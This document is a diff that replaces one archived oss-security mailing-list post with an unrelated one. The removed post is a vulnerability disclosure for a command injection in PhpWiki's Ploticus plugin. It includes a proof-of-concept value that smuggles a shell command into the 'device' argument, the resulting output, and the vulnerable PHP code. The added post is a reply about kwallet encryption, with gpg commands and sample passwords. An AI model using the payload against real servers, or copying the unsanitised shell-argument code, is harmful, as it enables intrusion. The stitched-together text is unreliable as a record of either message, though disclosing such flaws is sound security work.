@@ -1,118 +1,70 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/08/27/5
-Message-Id: <20140827222345.2D3DEC0112@smtp.hushmail.com>
-Date: Wed, 27 Aug 2014 23:23:45 +0100
-From: "Benjamin Harris" <bch@...h.ai>
-To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com
-Subject: PHP-Wiki Command Injection
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/01/04/2
+Message-ID: <20140104140230.GA31452@gremlin.ru>
+Date: Sat, 4 Jan 2014 18:02:30 +0400
+From: gremlin@...mlin.ru
+To: oss-security@...ts.openwall.com
+Subject: Re: kwallet crypto misuse
 Content-Type: text/plain; charset=utf-8
 
-Hi All
+On 03-Jan-2014 12:44:42 -0500, Daniel Kahn Gillmor wrote:
 
-OSS-Security, can I get a CVE for this please?
+ >>> UTF-16 encoding combined with Blowfish's 64 bit block size
+ >>> means there are just four password characters per block.
 
-URL: https://sourceforge.net/projects/phpwiki/
+ >> But this is: any and all passwords, being used for encryption
+ >> key generation, must be hashed, then salted, then hashed
+ >> again. SHA-256 may be a good choice for generating Blowfish
+ >> 256-bit key this way.
 
-I tried to report this a month ago, but got no response from the 
-developers. This is an old vulnerability I found while dusting off 
-some old hard drives.
+ > what kind of hashing and salting are you talking about?
 
-Brief:
--------------------------
+I'm talting about that very kind of hashing and salting which is
+normally used to generate an encryption key for symmetric cipher
+from the supplied password.
 
-PhpWiki is a WikiWikiWeb clone in PHP. A WikiWikiWeb is a site 
-where anyone can edit the pages through an HTML form. Multiple 
-storage backends, dynamic hyperlinking, themeable, scriptable by 
-plugins, full authentication, ACL's.
+ > i don't think hashing and salting makes sense in the context
+ > that you were quoting above. Are you aware that kwallet stores
+ > a database of passwords that need to be able to be produced back
+ > for the user (or the user's applications) in the clear?
+
+Are you aware that database of passwords is just user's data, which
+may be virtually anything?
+
+Suppose you want to generate a password for some resource and store
+it safely. One of the easiest methods to do that is running
+
+`mkpassphrase | gpg -ea > some_resource.gpg`
+
+but let's suppose you don't want to keep a keypair on that machine,
+so most likely you'll run
+
+`mkpassphrase | gpg -ca > some_resource.gpg`
+
+GPG will ask you (twice) for a password and produce the output like
+
+-----BEGIN PGP MESSAGE-----
+
+jA0ECgMC0nbVtnsmoZ9g0lQBFVTSY/avTaGibkt/dFGciqjGih1OXfLCPBRkv9gq
+sDqdOrjzSO0A+P5ziDalFWJEaNQR5mYQaj/eUP8YAM4e5baFvW+7mSMesuMXqEY1
++E0TCzY=
+=9DoC
+-----END PGP MESSAGE-----
+
+Now, once you need to access the data (generated password in this
+exemple), you may run
+
+`gpg < some_resource.gpg`
+
+provide the encryption password (try "Rent/Author!film2Cool") and
+get back the previously generated password: Sticky5scum0robust#Comic
+
+So, please don't mess the encryption password (key source) and stored
+password (user's data).
 
 
-Details:
---------------------------
+-- 
+Alexey V. Vissarionov aka Gremlin from Kremlin <gremlin ПРИ gremlin ТЧК ru>
+GPG: 8832FE9FA791F7968AC96E4E909DAC45EF3B1FA8 @ hkp://keys.gnupg.net
 
-Straight command injection in the Ploticus module. Attached is a 
-working POC.
-
-I found these notes I made:
-
-<<Ploticus device=";touch /tmp/owned;" -prefab= -csmap= data= alt= 
-help= >>
-$ ls -la owned
--rw-r--r-- 1 apache apache 0 Jan 18 15:23 owned
-
-
-vuln code with system execute at the bottom
-controllable param is $args
-           $gif = $argarray['device'];
-            $args = "-$gif -o $tempfile.$gif";
-                $code = $this->execute(PLOTICUS_EXE . " 
-$tempfile.plo $args", $tempfile.".$gif");
-
-['device'] is listed as an option by user when using the Politus 
-plugin
-"
-
-
-example usage;
- <?plugin Ploticus device||=png [ploticus options...]
-     multiline ploticus script ...
-  ?>
-
-:>> 
-
-   function getImage($dbi, $argarray, $request) {
-        //extract($this->getArgs($argstr, $request));
-        //extract($argarray);
-        $source =& $this->source;
-        if (!empty($source)) {
-            if ($this->withShellCommand($source)) {
-                $this->_errortext .= _("shell commands not allowed 
-in Ploticus");
-                return false;
-            }
-            if (is_array($argarray['data'])) { // support <!plugin-
-list !> pagelists
-                $src = "#proc getdata\ndata:";
-                $i = 0;
-                foreach ($argarray['data'] as $data) {
-                    // hash or array?
-                    if (is_array($data))
-                        $src .= ("\t" . join(" ", $data) . "\n");
-                    else
-                        $src .= ("\t" . '"' . $data . '" ' . $i++ . 
-"\n");
-                }
-                $src .= $source;
-                $source = $src;
-            }
-            $tempfile = $this->tempnam('Ploticus','plo');
-            @unlink($tempfile);
-            $gif = $argarray['device'];
-            $args = "-$gif -o $tempfile.$gif";
-            if (!empty($argarray['-csmap'])) {
-                    $args .= " -csmap -mapfile $tempfile.map";
-                    $this->_mapfile = "$tempfile.map";
-            }
-            if (!empty($argarray['-prefab'])) {
-                    //check $_ENV['PLOTICUS_PREFABS'] and default 
-directory
-                global $HTTP_ENV_VARS;
-                if (empty($HTTP_ENV_VARS['PLOTICUS_PREFABS'])) {
-                    if (file_exists("/usr/share/ploticus"))
-                        $HTTP_ENV_VARS['PLOTICUS_PREFABS'] = 
-"/usr/share/ploticus";
-                    elseif (defined('PLOTICUS_PREFABS'))
-                        $HTTP_ENV_VARS['PLOTICUS_PREFABS'] = 
-constant('PLOTICUS_PREFABS');
-                }
-                    $args .= (" -prefab " . $argarray['-prefab']);
-            }
-            if (isWindows()) {
-                $fp = fopen("$tempfile.plo", "w");
-                fwrite ($fp, $source);
-                fclose($fp);
-                $code = $this->execute(PLOTICUS_EXE . " 
-$tempfile.plo $args", $tempfile.".$gif");
-
-Many thanks,
-Ben
-View attachment "release.py" of type "text/x-python" (1855 bytes)
+Content of type "application/pgp-signature" skipped
